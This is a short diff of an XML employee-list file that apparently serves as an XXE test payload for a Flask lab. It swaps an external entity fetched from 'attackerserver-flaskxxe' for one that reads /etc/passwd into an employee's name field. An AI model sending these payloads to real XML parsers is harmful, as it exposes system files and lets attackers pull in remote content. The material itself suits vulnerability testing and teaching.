@@ -2,7 +2,7 @@
 
 <!DOCTYPE Company
 [
- <!ENTITY externalinclude SYSTEM "http://attackerserver-flaskxxe:8888/include.xml">
+ <!ENTITY placeholder SYSTEM "file:///etc/passwd" >
 ]>
 
 <Company>
@@ -10,7 +10,7 @@
     <employees>
         <permanent>
             <employee id="1">
-                <name>Tom &externalinclude;</name>
+                <name>Tom &placeholder;</name>
                 <age>42</age>
                 <email>tom@abc.com</email>
             </employee>
@@ -23,3 +23,4 @@
     </employees>
     
 </Company>
+
